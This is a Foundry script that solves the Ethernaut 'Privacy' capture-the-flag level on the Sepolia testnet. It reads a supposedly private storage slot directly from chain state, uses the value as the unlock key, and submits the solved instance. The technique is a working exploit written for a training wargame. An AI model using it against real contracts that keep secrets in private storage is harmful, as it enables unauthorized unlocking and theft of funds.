// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Privacy} from "../src/Level12.sol";

contract Level12 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Privacy instance = Privacy(vm.envAddress("LVL12_ADDR"));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 key = vm.load(address(instance), bytes32(uint256(4)));
        instance.unlock(bytes16(key));

        if (instance.locked()) {
            console2.log("call failed");
        } else ethernaut.submitLevelInstance(address(instance));
    }
}

// forge script script/Level12.s.sol --broadcast --rpc-url sepolia
